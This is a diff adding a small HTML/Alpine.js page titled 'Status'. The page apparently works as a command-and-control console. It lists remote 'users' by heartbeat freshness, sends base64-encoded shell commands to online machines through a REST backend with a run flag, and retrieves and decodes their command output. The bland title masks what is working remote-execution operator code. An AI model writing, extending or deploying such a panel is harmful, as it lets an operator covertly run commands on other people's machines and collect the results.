@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Status</title>
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <style>
+        .user-link:hover {
+            text-decoration: underline;
+        }
+
+        body {
+            background: black;
+            color: white;
+            font-family: monospace;
+            user-select: none;
+        }
+    </style>
+</head>
+
+<body x-data="app()" x-init="fetchData(); setInterval(() => fetchData(), 4000)">
+
+    <div x-show="!selected">
+        <h3>Users</h3>
+        <hr>
+        <template x-for="user in rows" :key="user.username">
+            <div style="margin-bottom: 10px;">
+                <span :style="{ color: getStatusColor(user) }">●</span>
+                <small @click="fetchSingle(user)" @contextmenu.prevent="viewOutput(user)" class="user-link"
+                    style="cursor: pointer;">
+                    <span x-text="user.username" style="font-weight: bold; margin-left: 5px;"></span>
+                    <span x-text="new Date(user.updated_at).toLocaleString()"
+                        style="margin-left: 10px; color: #888;"></span>
+                </small>
+            </div>
+        </template>
+    </div>
+
+    <script>
+        function app() {
+            return {
+                rows: [],
+                selected: false,
+                url: '',
+                apiKey: '',
+
+                async fetchData() {
+                    try {
+                        const response = await fetch(`${this.url}?select=username,updated_at&order=updated_at.desc`, {
+                            headers: {
+                                'apikey': this.apiKey,
+                                'Authorization': `Bearer ${this.apiKey}`
+                            }
+                        });
+                        this.rows = await response.json();
+                    } catch (err) {
+                        console.error(err);
+                    }
+                },
+
+                async viewOutput(user) {
+                    try {
+                        const response = await fetch(`${this.url}?select=out&username=eq.${user.username}`, {
+                            headers: {
+                                'apikey': this.apiKey,
+                                'Authorization': `Bearer ${this.apiKey}`
+                            }
+                        });
+                        const data = await response.json();
+
+                        if (data[0] && data[0].out) {
+                            const decoded = atob(data[0].out);
+                            await navigator.clipboard.writeText(decoded);
+                            alert(`Output for ${user.username} (Copied from clipboard):\n\n${decoded}`);
+                        } else {
+                            alert(`No output found for ${user.username}`);
+                        }
+                    } catch (err) {
+                        console.error(err);
+                    }
+                },
+
+                getStatusColor(user) {
+                    const diff = (new Date().getTime() - new Date(user.updated_at).getTime()) / 1000;
+                    if (diff < 20) return 'green';
+                    if (diff < 60) return 'yellow';
+                    return 'red';
+                },
+
+                fetchSingle(user) {
+                    if (this.getStatusColor(user) !== 'green') return;
+                    const cmd = prompt(`Send command to ${user.username}:`);
+                    if (cmd) this.sendCommand(user.username, btoa(cmd));
+                },
+
+                async sendCommand(username, b64Cmd) {
+                    await fetch(`${this.url}?username=eq.${username}`, {
+                        method: 'PATCH',
+                        headers: {
+                            'apikey': this.apiKey,
+                            'Authorization': `Bearer ${this.apiKey}`,
+                            'Content-Type': 'application/json',
+                            'Prefer': 'return=minimal'
+                        },
+                        body: JSON.stringify({ cmd: b64Cmd, run: true })
+                    });
+                }
+            }
+        }
+    </script>
+</body>
+
+</html>
